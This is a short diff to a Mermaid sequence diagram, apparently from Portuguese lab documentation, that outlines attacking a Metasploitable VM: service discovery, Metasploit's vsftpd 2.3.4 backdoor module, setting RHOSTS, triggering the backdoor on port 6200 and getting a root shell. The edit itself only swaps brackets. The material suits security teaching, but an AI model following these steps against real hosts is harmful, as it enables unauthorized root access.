@@ -302,7 +302,7 @@ sequenceDiagram
     B-->>A: Resposta: vsftpd 2.3.4, Samba 3.0.20, distcc...
     A->>A: search vsftpd (msfconsole)
     A->>A: use exploit/unix/ftp/vsftpd_234_backdoor
-    A->>A: set RHOSTS <IP do Metasploitable>
+    A->>A: set RHOSTS (IP do Metasploitable)
     A->>B: exploit (aciona backdoor porta 6200)
     B-->>A: Shell root aberto
     A->>A: id, whoami, uname -a
